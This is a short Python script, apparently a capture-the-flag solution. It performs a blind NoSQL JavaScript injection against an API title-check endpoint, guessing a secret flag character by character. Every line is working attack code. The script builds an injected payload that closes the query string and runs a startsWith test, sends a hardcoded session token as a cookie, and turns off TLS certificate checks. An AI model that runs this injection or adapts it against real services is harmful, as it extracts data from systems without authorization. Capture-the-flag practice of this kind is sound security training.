import requests
import urllib3
import string
import urllib
from urllib.parse import quote_plus
urllib3.disable_warnings()

username="admin"
flag=""
u="http://three.jh2i.com:50009/api/check_title?title="
headers={
    'Cookie': 'token=eyJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6InVzZXIifQ.hZaL8sut1BmNNdpiZPXCPm-ouLLrOVrNV1FKHLIbXxuZQV0C9EJs3qDNYtTm-QLFeGZ45absbN3RBGvwRVe8-YXbO4uHSTTyLblDr3h1XgSff0xokTi1K4K8MYFCS2y7LoubIj_yxk2maVe4Zs30yPSWF74hA9Bz3slqJahvFZSTJxNmv_ukZO9ivR7cWnpm_mJ-7mOPEEFak5Zzq5DdQqWppdWSo3GlV3976XmGfn7FNTQAqvZPbfoUhnOILqsMe8fxR9kd3GOn7AP9XVlYtdNKMPnYK12_kTRN5yEX_ise_dgLjyAd5dlFncqkaVBUGyufSmqzN_2NW1_xSC1BMA'
}

while True:
    for c in "}_{" + string.ascii_letters + string.digits:
        payload="'; return this.title.startsWith('%s') && !'" % (flag + c)
        url=u + quote_plus(payload)

        r = requests.get(url, headers = headers, verify = False, allow_redirects = False)
        if r.text != '0':
            print("Found one more char : %s" % (flag+c))
            flag += c
            break